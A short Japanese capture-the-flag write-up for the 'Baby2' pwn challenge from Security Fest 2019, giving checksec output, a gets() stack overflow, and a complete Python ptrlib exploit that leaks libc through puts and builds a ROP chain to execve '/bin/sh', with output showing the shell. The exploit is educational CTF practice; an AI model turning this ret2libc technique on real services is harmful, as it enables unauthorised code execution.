# [pwn 180pts] Baby2 - Security Fest 2019
64ビットでRELROが有効です。libcは配布されています。
```
$ checksec -f baby2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   67 Symbols     No	0		4	baby2
```

IDAで解析したところ、Baby1同様にgetsによるStack Overflowがあります。
Baby1のようにsystem関数がないので、libc leakしてからROPしましょう。

```python
from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./baby2")
sock = Process("./baby2")

rop_pop_rdi = 0x00400783
plt_puts = 0x400550

# Leak libc base
payload = b'A' * 0x18
payload += p64(rop_pop_rdi)
payload += p64(elf.got("printf"))
payload += p64(plt_puts)
payload += p64(elf.symbol("main"))
sock.recvuntil("input: ")
sock.sendline(payload)
addr_printf = u64(sock.recvline().rstrip())
libc_base = addr_printf - libc.symbol("printf")
dump("libc base = " + hex(libc_base))

rop_pop_rax = libc_base + 0x000439c7
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rdi = libc_base + 0x0002155f
rop_pop_rsi = libc_base + 0x00023e6a
rop_syscall = libc_base + 0x000013c0

# Get the shell!
payload = b'A' * 0x18
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.recvuntil("input: ")
sock.sendline(payload)

sock.interactive()
```

ほい。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=10110)
[ptrlib] libc base = 0x7fb749208000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
最近この程度の問題だと一発で通るので不思議な感覚になる。
「ROP意味分かんないー」って言ってた頃が懐かしい。